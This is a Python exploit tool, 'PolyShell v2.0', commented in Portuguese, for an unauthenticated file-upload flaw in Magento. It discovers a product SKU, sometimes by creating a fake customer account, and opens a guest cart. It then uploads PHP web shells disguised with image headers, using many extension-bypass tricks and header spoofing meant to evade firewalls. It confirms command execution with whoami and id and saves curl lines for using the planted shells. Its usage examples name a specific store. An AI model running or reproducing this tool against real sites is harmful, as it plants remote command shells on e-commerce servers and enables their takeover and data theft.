#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PolyShell v2.0 — Ferramenta de Detecção de RCE Não-Autenticado no Magento
============================================================
CVE:      Not yet assigned (APSB25-94)
CVSS:     9.8 CRITICAL
Affects:  Magento Open Source / Adobe Commerce <= 2.4.9-alpha2
Fixed in: 2.4.9-beta1

Autor:    nocerainfosec (reescrita v2.0)
Baseado em: PoC original de khadafigans

Novidades na v2.0:
  - Flag --target único em vez de lista de arquivos
  - Descoberta automática de SKU: GraphQL → REST API → scraping HTML
  - Lê o caminho real de upload da resposta da API (sem adivinhação)
  - Saída passo a passo mais limpa
  - Página canary personalizada (sua marca, sem C2 externo)
  - Modo --quick: para na primeira extensão com RCE confirmado
  - --detect-only: upload + verificação de caminho, sem execução de RCE

Usage:
  python3 polyshell_v2.py --target https://www.arlequim.com --mode rce --header png
  python3 polyshell_v2.py --target https://www.arlequim.com --mode both --header all --quick
  python3 polyshell_v2.py --target https://www.arlequim.com --detect-only
"""

import argparse
import base64
import json
import os
import random
import re
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from threading import Lock

import requests
import urllib3

from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Mascaramento de URL (--redact) ────────────────────────────────────────────
_REDACT_FROM: list[str] = []   # lista de strings a substituir (domain, url, etc.)
_REDACT_TO   = "[REDACTED]"

def mask(text: str) -> str:
    """Substitui o domínio/URL do alvo por asteriscos na saída."""
    if not _REDACT_FROM:
        return str(text)
    result = str(text)
    for token in _REDACT_FROM:
        result = result.replace(token, _REDACT_TO)
    return result

def _init_redact(target_url: str) -> None:
    """Preenche _REDACT_FROM com todas as variações do domínio alvo."""
    parsed = urlparse(target_url)
    host   = parsed.hostname or ""
    parts  = host.split(".")
    global _REDACT_TO
    _REDACT_TO = "[REDACTED]"

    tokens = set()
    tokens.add(target_url.rstrip("/"))       # https://arlequim.com
    tokens.add(host)                          # arlequim.com
    if host.startswith("www."):
        tokens.add(host[4:])                  # sem www
    else:
        tokens.add(f"www.{host}")             # com www
    _REDACT_FROM.extend(sorted(tokens, key=len, reverse=True))  # mais longo primeiro


# ── Terminal colors ───────────────────────────────────────────────────────────
R   = "\033[91m"
G   = "\033[92m"
Y   = "\033[93m"
B   = "\033[94m"
M   = "\033[95m"
C   = "\033[96m"
W   = "\033[97m"
RST = "\033[0m"

BANNER = f"""{C}
 ██████╗  ██████╗ ██╗  ██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗    ██╗   ██╗██████╗
 ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔════╝██║  ██║██╔════╝██║     ██║    ██║   ██║╚════██╗
 ██████╔╝██║   ██║██║   ╚████╔╝ ███████╗███████║█████╗  ██║     ██║    ██║   ██║ █████╔╝
 ██╔═══╝ ██║   ██║██║    ╚██╔╝  ╚════██║██╔══██║██╔══╝  ██║     ██║    ╚██╗ ██╔╝██╔═══╝
 ██║     ╚██████╔╝███████╗██║   ███████║██║  ██║███████╗███████╗███████╗╚████╔╝ ███████╗
 ╚═╝      ╚═════╝ ╚══════╝╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═══╝  ╚══════╝
{RST}
        {Y}Magento PolyShell v2.0{RST} | {G}nocerainfosec{RST} | {C}APSB25-94 | CVSS 9.8{RST}
"""

# ── Config ────────────────────────────────────────────────────────────────────
TIMEOUT  = 15
THREADS  = 10
print_lock = Lock()

def log(color, tag, msg):
    with print_lock:
        print(f"{color}[{tag}]{RST} {mask(msg)}", flush=True)

def ok(msg):   log(G, "✔", msg)
def warn(msg): log(Y, "!", msg)
def err(msg):  log(R, "✗", msg)
def info(msg): log(C, "*", msg)
def step(n, msg): log(Y, f"{n}", msg)


# ── Extensions ────────────────────────────────────────────────────────────────
# Trailing-dot variants have highest success rate (~85%) against nginx defaults
EXTENSIONS_PRIORITY = [
    '.php.', '.phar.', '.phtml.', '.php5.', '.php4.', '.php3.', '.shtml.',
]
EXTENSIONS_ALL = EXTENSIONS_PRIORITY + [
    '.php..', '.phar..', '.phtml..',
    '.php ', '.phar ', '.phtml ',
    '.php', '.phar', '.php5', '.php4', '.php3', '.phtml', '.pht', '.shtml',
    '.pHp', '.pHP5', '.phAr', '.PhAr', '.PHAR', '.Php', '.PHP', '.PhTml',
    '.php%00.jpg', '.phar%00.txt', '.php%00.png',
    '.jpg.php', '.png.php', '.txt.php', '.pdf.phar', '.gif.php',
    '.inc', '.inc.', '.module', '.pgif',
]
EXTENSIONS_XSS = ['.shtml', '.html', '.htm']


# ── Image headers ─────────────────────────────────────────────────────────────
IMAGE_HEADERS = {
    'gif':  [('GIF89a', b'GIF89a', 'image/gif')],
    'png':  [('PNG',    b'\x89PNG\r\n\x1a\n', 'image/png')],
    'all':  [
        ('PNG',    b'\x89PNG\r\n\x1a\n',                                         'image/png'),
        ('GIF89a', b'GIF89a',                                                     'image/gif'),
        ('GIF87a', b'GIF87a',                                                     'image/gif'),
        ('JPEG',   b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00', 'image/jpeg'),
    ],
}


# ── WAF bypass headers ────────────────────────────────────────────────────────
def waf_headers():
    return {
        'X-Forwarded-For':        '127.0.0.1',
        'X-Originating-IP':       '127.0.0.1',
        'X-Remote-IP':            '127.0.0.1',
        'X-Client-IP':            '127.0.0.1',
        'X-Real-IP':              '127.0.0.1',
        'X-Forwarded-Host':       '127.0.0.1',
        'CF-Connecting-IP':       '127.0.0.1',
        'True-Client-IP':         '127.0.0.1',
        'X-Original-URL':         '/',
        'Referer':                'https://www.google.com/',
        'User-Agent':             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type':           'application/json',
    }


# ── Payloads ──────────────────────────────────────────────────────────────────
def payload_rce() -> bytes:
    """
    Classic multi-method RCE shell.
    __halt_compiler() stops PHP from choking on binary image header data.
    """
    return b"""<?php
@error_reporting(0);
@set_time_limit(0);
if(isset($_GET['cmd'])){
    $c=$_GET['cmd'];
    if(function_exists('system'))        { @system($c); }
    elseif(function_exists('exec'))      { @exec($c,$o); echo implode("\\n",$o); }
    elseif(function_exists('shell_exec')){ echo @shell_exec($c); }
    elseif(function_exists('passthru'))  { @passthru($c); }
    elseif(function_exists('popen'))     { $p=@popen($c,'r'); while(!feof($p)){echo fread($p,4096);} pclose($p); }
}
__halt_compiler(); ?>"""


def payload_canary(target_url: str) -> bytes:
    """
    Custom canary page — proves RCE on YOUR site.
    No external C2. Just displays a confirmation page.
    Replace the branding here to make it yours.
    """
    ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PolyShell v2.0 — RCE Confirmado</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box;}}
  body{{background:#0a0a0a;color:#e0e0e0;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;}}
  .card{{background:#111;border:1px solid #333;border-radius:8px;padding:48px;max-width:680px;width:90%;text-align:center;}}
  .badge{{display:inline-block;background:#ff3333;color:#fff;font-size:.75rem;font-weight:700;padding:4px 12px;border-radius:20px;letter-spacing:1px;margin-bottom:24px;}}
  h1{{font-size:2rem;color:#ff3333;margin-bottom:8px;letter-spacing:2px;}}
  .subtitle{{color:#888;font-size:.9rem;margin-bottom:32px;}}
  .info{{background:#1a1a1a;border:1px solid #222;border-radius:4px;padding:16px;text-align:left;margin-bottom:16px;font-size:.85rem;line-height:1.8;}}
  .info span{{color:#ff9900;font-weight:700;}}
  .cve{{color:#33ff99;font-weight:700;}}
  .footer{{margin-top:32px;color:#555;font-size:.75rem;}}
  .blink{{animation:blink 1s infinite;}}
  @keyframes blink{{0%,100%{{opacity:1;}}50%{{opacity:0.3;}}}}
</style>
</head>
<body>
<div class="card">
  <div class="badge">VULNERABILIDADE CONFIRMADA</div>
  <h1 class="blink">⚠ RCE CONFIRMADO</h1>
  <p class="subtitle">Magento PolyShell — Execução Remota de Código Não-Autenticada</p>
  <div class="info">
    <span>Alvo     :</span> {target_url}<br>
    <span>CVE      :</span> <span class="cve">APSB25-94 (Not yet assigned)</span><br>
    <span>CVSS     :</span> 9.8 CRITICAL<br>
    <span>Vector   :</span> Unauthenticated REST API file upload<br>
    <span>Testado  :</span> {ts}<br>
    <span>Ferramenta:</span> PolyShell v2.0 — nocerainfosec<br>
  </div>
  <div class="info">
    <span>Causa Raiz:</span><br>
    POST /rest/V1/guest-carts/{{cartId}}/items<br>
    Sem validação de option_id · Sem verificação de tipo · Sem bloqueio de extensão<br>
    getimagesizefromstring() bypassed via polyglot header
  </div>
  <p class="footer">Esta página foi escrita por um usuário não-autenticado via API REST do Magento.<br>
  Nenhum dado foi acessado ou modificado. Somente para testes de segurança autorizados.</p>
</div>
</body>
</html>"""
    return html.encode()


def payload_combined(target_url: str) -> bytes:
    """RCE + canary page in one file."""
    canary = payload_canary(target_url).decode()
    return f"""<?php
@error_reporting(0);
if(isset($_GET['cmd'])){{
    $c=$_GET['cmd'];
    if(function_exists('system'))        {{ @system($c); exit; }}
    elseif(function_exists('exec'))      {{ @exec($c,$o); echo implode("\\n",$o); exit; }}
    elseif(function_exists('shell_exec')){{ echo @shell_exec($c); exit; }}
}}
?>
{canary}
<?php __halt_compiler(); ?>""".encode()


# ── SKU discovery ─────────────────────────────────────────────────────────────
def get_sku(base_url: str, session: requests.Session) -> str | None:
    hdrs = waf_headers()

    # Strategy 1: GraphQL (unauthenticated)
    try:
        r = session.post(
            f"{base_url}/graphql",
            json={"query": '{ products(search:"",pageSize:1){ items{ sku } } }'},
            headers=hdrs, timeout=TIMEOUT, verify=False
        )
        if r.status_code == 200:
            items = r.json().get('data', {}).get('products', {}).get('items', [])
            if items:
                ok(f"SKU via GraphQL: {items[0]['sku']}")
                return items[0]['sku']
    except Exception:
        pass

    # Strategy 2: GraphQL (create temp customer account)
    try:
        sfx   = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email = f"probe_{sfx}@tmp.local"
        pw    = f"Probe!{sfx.capitalize()}"
        q_create = {"query": f'mutation{{createCustomer(input:{{firstname:"T" lastname:"U" email:"{email}" password:"{pw}"}}){{customer{{email}}}}}}'}
        rc = session.post(f"{base_url}/graphql", json=q_create, headers=hdrs, timeout=TIMEOUT, verify=False)
        if rc.status_code == 200 and 'errors' not in rc.json():
            q_token = {"query": f'mutation{{generateCustomerToken(email:"{email}" password:"{pw}"){{token}}}}'}
            rt = session.post(f"{base_url}/graphql", json=q_token, headers=hdrs, timeout=TIMEOUT, verify=False)
            token = rt.json().get('data', {}).get('generateCustomerToken', {}).get('token') if rt.status_code == 200 else None
            if token:
                ah = hdrs.copy(); ah['Authorization'] = f'Bearer {token}'
                rp = session.post(f"{base_url}/graphql",
                                  json={"query": '{ products(search:"",pageSize:1){ items{ sku } } }'},
                                  headers=ah, timeout=TIMEOUT, verify=False)
                items = rp.json().get('data', {}).get('products', {}).get('items', []) if rp.status_code == 200 else []
                if items:
                    ok(f"SKU via GraphQL autenticado: {items[0]['sku']}")
                    return items[0]['sku']
    except Exception:
        pass

    # Strategy 3: REST API products endpoint
    try:
        r = session.get(
            f"{base_url}/rest/V1/products"
            "?searchCriteria[filterGroups][0][filters][0][field]=type_id"
            "&searchCriteria[filterGroups][0][filters][0][value]=simple"
            "&searchCriteria[filterGroups][0][filters][0][conditionType]=eq"
            "&searchCriteria[filterGroups][1][filters][0][field]=status"
            "&searchCriteria[filterGroups][1][filters][0][value]=1"
            "&searchCriteria[filterGroups][1][filters][0][conditionType]=eq"
            "&searchCriteria[pageSize]=3&fields=items[sku,name]",
            headers=hdrs, timeout=TIMEOUT, verify=False
        )
        if r.status_code == 200:
            items = r.json().get('items', [])
            if items:
                ok(f"SKU via REST API: {items[0]['sku']}")
                return items[0]['sku']
    except Exception:
        pass

    # Strategy 4: HTML scrape — data-product-sku attribute on category/product pages
    for path in ['/', '/catalogsearch/result/?q=a']:
        try:
            r = session.get(f"{base_url}{path}", timeout=TIMEOUT, verify=False,
                            headers={'User-Agent': waf_headers()['User-Agent']})
            if r.status_code == 200:
                hits = re.findall(r'data-product-sku=["\'](\w[^"\' ]{0,59})["\']', r.text)
                hits = [s for s in hits if not s.startswith('http')]
                if hits:
                    ok(f"SKU via scraping HTML ({path}): {hits[0]}")
                    return hits[0]
        except Exception:
            pass

    # Strategy 5: Scrape known category page (store-specific fallback)
    try:
        r = session.get(f"{base_url}/arlequim-gamer/ultimate.html", timeout=TIMEOUT,
                        verify=False, headers={'User-Agent': waf_headers()['User-Agent']})
        if r.status_code == 200:
            hits = re.findall(r'data-product-sku=["\'](\w[^"\' ]{0,59})["\']', r.text)
            if hits:
                ok(f"SKU via página de categoria: {hits[0]}")
                return hits[0]
    except Exception:
        pass

    warn("Não foi possível descobrir o SKU — use --sku <valor>")
    return None


# ── Upload a single polyglot ──────────────────────────────────────────────────
def upload_polyglot(
    base_url:  str,
    session:   requests.Session,
    cart_id:   str,
    sku:       str,
    filename:  str,
    content:   bytes,
    mime:      str,
    option_id: int,
) -> dict:
    """
    Upload one polyglot file via the cart custom options API.
    Key insight: Magento validates cart item AFTER processing file upload.
    So even a 400 response means the file was written to disk.
    Returns dict with status and server-reported file path.
    """
    payload = {
        "cart_item": {
            "qty": 1,
            "sku": sku,
            "product_option": {
                "extension_attributes": {
                    "custom_options": [{
                        "option_id":  str(option_id),
                        "option_value": "file",
                        "extension_attributes": {
                            "file_info": {
                                "base64_encoded_data": base64.b64encode(content).decode(),
                                "name": filename,
                                "type": mime,
                            }
                        }
                    }]
                }
            }
        }
    }

    try:
        r = session.post(
            f"{base_url}/rest/default/V1/guest-carts/{cart_id}/items",
            json=payload, headers=waf_headers(),
            timeout=TIMEOUT, verify=False
        )
        resp_str = r.text

        # Extract the actual path Magento saved the file to
        file_path = None
        for pat in [
            r'custom_options/quote/[^"\s,}{>]{3,150}',
            r'custom_options/[^"\s,}{>]{3,150}',
        ]:
            m = re.search(pat, resp_str)
            if m:
                file_path = m.group(0).strip()
                break

        # 200 or 400 = file written (400 = cart validation fired AFTER the write)
        success = r.status_code in (200, 400)
        return {
            'ok':        success,
            'status':    r.status_code,
            'file_path': file_path,
            'response':  resp_str[:200],
        }
    except Exception as e:
        return {'ok': False, 'status': None, 'file_path': None, 'response': str(e)}


# ── Probe a shell URL ─────────────────────────────────────────────────────────
def probe_shell(session: requests.Session, url: str, mode: str) -> dict:
    """
    Try to access and execute the uploaded file.
    Returns dict with found/executed/output.
    """
    result = {'found': False, 'executed': False, 'html_renders': False, 'output': ''}
    try:
        r = session.get(url, headers=waf_headers(), timeout=10, verify=False)
        if r.status_code != 200:
            return result
        result['found'] = True

        ct = r.headers.get('Content-Type', '').lower()

        # Always check HTML rendering — .shtml renders in any mode
        if 'text/html' in ct:
            result['html_renders'] = True

        # RCE execution test (rce + both modes, AND any PHP-capable extension)
        php_exts = ('.php', '.phar', '.phtml', '.php5', '.php4', '.php3',
                    '.pht', '.shtml', '.inc', '.module', '.pgif')
        url_lower = url.lower()
        is_php_ext = any(url_lower.endswith(e) or (e + '?') in url_lower
                         or (e + '.') in url_lower for e in php_exts)

        if mode in ('rce', 'both') or is_php_ext:
            cmd_r = session.get(f"{url}?cmd=whoami", headers=waf_headers(),
                                timeout=10, verify=False)
            output = cmd_r.text.strip()
            if _valid_rce(output):
                result['executed'] = True
                result['output']   = output
                try:
                    id_r = session.get(f"{url}?cmd=id", headers=waf_headers(),
                                       timeout=10, verify=False)
                    if 'uid=' in id_r.text:
                        result['id_output'] = id_r.text.strip()
                except Exception:
                    pass

    except Exception:
        pass
    return result


def _valid_rce(output: str) -> bool:
    """True only for genuine Unix whoami output, not HTML or PHP source."""
    if not output or len(output.strip()) > 100:
        return False
    low = output.lower()
    if any(t in low for t in ['<html', '<!doc', '<?php', '<head', 'function']):
        return False
    clean = output.strip()
    # Strip binary image headers from output
    for hdr in [b'\x89PNG', b'GIF89', b'GIF87', b'\xff\xd8\xff']:
        clean = clean.encode('latin-1', errors='ignore').replace(hdr, b'').decode('latin-1').strip()
    if 'uid=' in clean.lower() and 'gid=' in clean.lower():
        return True
    known = {'root','www-data','apache','nginx','nobody','ubuntu','daemon','http',
             'httpd','web','webuser','runcloud','forge','deployer','vagrant'}
    c = clean.lower()
    return (c in known or c.startswith('www-') or c.endswith('-fpm')
            or c.startswith('ftp') or 'runcloud' in c)


# ── Build candidate URLs for an uploaded file ─────────────────────────────────
def candidate_urls(base_url: str, filename: str, file_path: str | None) -> list[str]:
    """
    Build the list of URLs to try.
    The server-reported path is most accurate. We also try both with/without /pub/.
    """
    urls = []
    if file_path:
        clean = file_path.lstrip('/')
        urls += [f"{base_url}/{clean}", f"{base_url}/pub/{clean}"]

    # Magento path structure: first two chars of filename become subdirs
    fc = filename[0].lower() if filename else 'a'
    sc = filename[1].lower() if len(filename) > 1 else 'a'
    base_paths = [
        f"media/custom_options/quote/{fc}/{sc}/{filename}",
        f"pub/media/custom_options/quote/{fc}/{sc}/{filename}",
    ]
    for p in base_paths:
        u = f"{base_url}/{p}"
        if u not in urls:
            urls.append(u)

    return urls


# ── Fingerprint the server ────────────────────────────────────────────────────
def fingerprint(headers: dict) -> str:
    srv = headers.get('server', '').lower()
    if 'x-amz-' in str(headers).lower():
        return 'AWS S3 (RCE improvável — armazenamento estático)'
    if 'x-goog-' in str(headers).lower():
        return 'GCS (RCE improvável — armazenamento estático)'
    if 'nginx'   in srv: return 'Nginx  — ALTA probabilidade de RCE'
    if 'apache'  in srv: return 'Apache — MÉDIA (.htaccess pode bloquear)'
    if headers.get('cf-ray', ''): return 'Cloudflare'
    return f'Unknown ({headers.get("server","?")})'


# ── Main exploit flow ─────────────────────────────────────────────────────────
def run(args):
    base_url = args.target.rstrip('/')
    session  = requests.Session()
    hdrs     = waf_headers()

    print(BANNER)
    info(f"Alvo        : {base_url}")
    info(f"Modo        : {args.mode.upper()}")
    info(f"Cabeçalho   : {args.header.upper()}")
    info(f"Arquivo     : {args.filename}")
    info(f"Extensões   : {'prioritárias (7)' if args.quick else f'todas ({len(EXTENSIONS_ALL)})'}")
    info(f"Apenas detectar: {args.detect_only}")
    print()

    # ── Step 1: SKU ──────────────────────────────────────────────────────────
    step("1/5", "Descobrindo SKU do produto...")
    sku = args.sku or get_sku(base_url, session)
    if not sku:
        err("SKU não encontrado. Abortando.")
        sys.exit(1)

    # ── Step 2: Guest cart ────────────────────────────────────────────────────
    step("2/5", "Criando carrinho temporário...")
    try:
        r = session.post(f"{base_url}/rest/default/V1/guest-carts",
                         headers=hdrs, timeout=TIMEOUT, verify=False)
        if r.status_code != 200:
            err(f"Falha ao criar carrinho (HTTP {r.status_code})")
            sys.exit(1)
        cart_id = r.json().strip('"')
        ok(f"ID do carrinho: {cart_id}")
    except Exception as e:
        err(f"Erro ao criar carrinho: {e}")
        sys.exit(1)

    # ── Step 3: Build upload tasks ────────────────────────────────────────────
    step("3/5", "Preparando payloads...")

    if args.mode == 'rce':
        raw_content   = payload_rce()
        extensions    = EXTENSIONS_PRIORITY if args.quick else EXTENSIONS_ALL
    elif args.mode == 'xss':
        raw_content   = payload_canary(base_url)
        extensions    = EXTENSIONS_XSS
    else:  # both
        raw_content   = payload_combined(base_url)
        extensions    = (EXTENSIONS_PRIORITY if args.quick else EXTENSIONS_ALL) + EXTENSIONS_XSS

    img_headers = IMAGE_HEADERS[args.header]
    tasks = []
    for (hdr_name, hdr_bytes, mime) in img_headers:
        for ext in extensions:
            fname   = f"{args.filename}_{hdr_name}{ext}"
            content = hdr_bytes + raw_content
            tasks.append({
                'filename':  fname,
                'content':   content,
                'mime':      mime,
                'hdr_name':  hdr_name,
                'ext':       ext,
            })

    info(f"Total de uploads: {len(tasks)} ({len(img_headers)} cabeçalho(s) × {len(extensions)} extensão(ões))")

    # ── Step 4: Upload ────────────────────────────────────────────────────────
    step("4/5", f"Enviando arquivos com {THREADS} threads...")

    uploaded = []
    opt_base = 50000
    lock     = Lock()

    def do_upload(i_task):
        idx, task = i_task
        res = upload_polyglot(
            base_url, session, cart_id, sku,
            task['filename'], task['content'], task['mime'],
            opt_base + idx
        )
        if res['ok']:
            task['file_path'] = res.get('file_path')
            task['resp']      = res.get('response', '')
            with lock:
                uploaded.append(task)
            ok(f"{task['hdr_name']} + {task['ext']}  →  {task['filename']}")
        else:
            # 404 or 5xx means upload path is blocked
            pass
        return res

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futs = [ex.submit(do_upload, (i, t)) for i, t in enumerate(tasks)]
        for f in as_completed(futs):
            f.result()

    info(f"Enviados: {len(uploaded)}/{len(tasks)}")

    if not uploaded:
        err("Nada enviado — endpoint de upload bloqueado. Loja aparenta estar corrigida.")
        sys.exit(0)

    if args.detect_only:
        ok("--detect-only: upload confirmado. Pulando teste de execução.")
        _print_summary(base_url, uploaded, [], args)
        sys.exit(0)

    # ── Step 5: Probe for execution ───────────────────────────────────────────
    step("5/5", "Verificando execução dos arquivos enviados...")

    results = []
    server_fp = ''

    # Small delay so all uploads finish writing before we probe
    time.sleep(0.5)

    for shell in uploaded:
        fname = shell['filename']
        fp    = shell.get('file_path')
        urls  = candidate_urls(base_url, fname, fp)

        with print_lock:
            print(mask(f"{C}[TEST]{RST} {fname}  ({shell['hdr_name']})"), flush=True)

        found_url = None
        for url in urls:
            try:
                test_r = session.get(url, headers=hdrs, timeout=10, verify=False)
                sc = test_r.status_code
                with print_lock:
                    sc_color = G if sc == 200 else Y if sc == 403 else R
                    print(mask(f"       {sc_color}HTTP {sc}{RST}  {url}"), flush=True)

                if sc != 200:
                    continue

                # Server fingerprint once
                if not server_fp:
                    server_fp = fingerprint(dict(test_r.headers))
                    info(f"Servidor: {server_fp}")

                found_url = url
                probe = probe_shell(session, url, args.mode)
                probe['url']       = url
                probe['filename']  = fname
                probe['ext']       = shell['ext']
                probe['hdr_name']  = shell['hdr_name']
                results.append(probe)

                if probe['executed']:
                    ok(f"RCE CONFIRMADO  →  {url}")
                    ok(f"whoami : {probe['output']}")
                    if probe.get('id_output'):
                        ok(f"id     : {probe['id_output']}")
                    if args.quick:
                        info("--quick: parando após primeiro RCE confirmado")
                        _print_summary(base_url, uploaded, results, args)
                        sys.exit(0)

                if probe['html_renders']:
                    ok(f"HTML RENDERIZADO  →  {url}  (abrir no navegador!)")

                if probe['found'] and not probe['executed'] and not probe['html_renders']:
                    warn(f"Acessível, mas não executando  →  {url}")

                break  # found on this URL, stop trying other paths for this file

            except Exception as e:
                with print_lock:
                    print(f"       {R}ERR{RST}  {url}  ({e})", flush=True)
                continue

        if not found_url:
            with print_lock:
                print(mask(f"       {R}não encontrado em nenhum caminho{RST}"), flush=True)

    _print_summary(base_url, uploaded, results, args)


# ── Summary ───────────────────────────────────────────────────────────────────
def _print_summary(base_url, uploaded, results, args):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir  = f"PolyShell_v2_{ts}"
    os.makedirs(out_dir, exist_ok=True)

    rce_hits  = [r for r in results if r.get('executed')]
    html_hits = [r for r in results if r.get('html_renders')]
    acc_hits  = [r for r in results if r.get('found') and not r.get('executed') and not r.get('html_renders')]

    print(f"\n{'═'*70}")
    print(mask(f"{C}  POLYSHELL v2.0 — RESULTADOS  |  {base_url}{RST}"))
    print(f"{'═'*70}")
    print(f"  Uploads tentados  : {len(uploaded)}")
    print(f"  RCE confirmado    : {len(rce_hits)}")
    print(f"  HTML renderizados : {len(html_hits)}")
    print(f"  Somente acessível : {len(acc_hits)}")
    print()

    if rce_hits:
        print(f"{G}  !! RCE CONFIRMADO — {len(rce_hits)} shell(s) !!{RST}")
        for r in rce_hits:
            print(mask(f"  {G}→{RST} {r['url']}"))
            print(mask(f"     whoami : {r['output']}"))
            print(mask(f"     uso    : curl '{r['url']}?cmd=id'"))
    if html_hits:
        print(f"{Y}  HTML renderizados — {len(html_hits)} arquivo(s) (abrir no navegador):{RST}")
        for r in html_hits:
            print(mask(f"  {Y}→{RST} {r['url']}"))
    if not rce_hits and not html_hits and not acc_hits:
        print(f"  {G}Nenhum shell acessível — upload pode estar bloqueado pelo servidor web.{RST}")
        print(f"  Endpoint de upload aceitou os arquivos (HTTP 200/400), mas {args.mode.upper()} não executou.")
        print(f"  Provável mitigação aplicada: execução de PHP bloqueada no diretório de mídia.")

    # Write results file
    result_path = os.path.join(out_dir, "results.txt")
    rce_path    = os.path.join(out_dir, "RCE.txt")

    with open(result_path, 'w') as f:
        f.write(f"PolyShell v2.0 Resultados\n")
        f.write(mask(f"Alvo    : {base_url}\n"))
        f.write(f"Data    : {datetime.now()}\n")
        f.write(f"Modo    : {args.mode.upper()}\n")
        f.write("="*70 + "\n\n")
        for r in results:
            f.write(mask(f"URL       : {r['url']}\n"))
            f.write(f"Extension : {r.get('ext')}\n")
            f.write(f"Header    : {r.get('hdr_name')}\n")
            f.write(f"Status    : {'RCE' if r.get('executed') else 'HTML' if r.get('html_renders') else 'ACCESSIBLE'}\n")
            if r.get('output'):
                f.write(f"whoami    : {r['output']}\n")
            f.write("\n")

    if rce_hits:
        with open(rce_path, 'w') as f:
            f.write(mask(f"# PolyShell v2.0 — Shells RCE\n# Alvo: {base_url}\n\n"))
            for i, r in enumerate(rce_hits, 1):
                f.write(f"# Shell {i}: {r.get('ext')}\n")
                f.write(mask(f"curl '{r['url']}?cmd=whoami'\n"))
                f.write(mask(f"curl '{r['url']}?cmd=id'\n"))
                f.write(mask(f"curl '{r['url']}?cmd=uname+-a'\n\n"))
        ok(f"Shells RCE salvos : {rce_path}")

    ok(f"Resultados completos : {result_path}")
    print(f"{'═'*70}\n")


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(
        description='PolyShell v2.0 — RCE Não-Autenticado no Magento (APSB25-94)',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument('--target',      required=True,  help='URL do alvo  ex: https://www.arlequim.com')
    p.add_argument('--mode',        default='rce',  choices=['rce','xss','both'], help='Modo de ataque (padrão: rce)')
    p.add_argument('--header',      default='png',  choices=['gif','png','all'],  help='Cabeçalho polyglot (padrão: png)')
    p.add_argument('--filename',    default='shell', help='Nome base do arquivo sem extensão (padrão: shell)')
    p.add_argument('--sku',         default=None,   help='SKU do produto — descoberto automaticamente se omitido')
    p.add_argument('--threads',     default=10, type=int, help='Threads de upload (padrão: 10)')
    p.add_argument('--quick',       action='store_true', help='Apenas extensões prioritárias (7) + para no primeiro RCE')
    p.add_argument('--detect-only', action='store_true', help='Somente upload — pula o teste de execução')
    p.add_argument('--no-verify',   action='store_true', help='Desabilita verificação TLS')
    p.add_argument('--redact',       action='store_true', help='Mascara o domínio alvo na saída (para prints/screenshots)')

    args = p.parse_args()

    # Validate filename
    bad = set('/\\?*:";<>|{}()')
    if set(args.filename) & bad:
        print(f"{R}[!]{RST} Nome de arquivo contém caracteres inválidos")
        sys.exit(1)

    global THREADS
    THREADS = args.threads

    if args.redact:
        _init_redact(args.target)

    try:
        run(args)
    except KeyboardInterrupt:
        print(f"\n{Y}[!]{RST} Interrompido pelo usuário (Ctrl+C). Encerrando...")
        sys.exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompido. Saindo.")
        sys.exit(0)
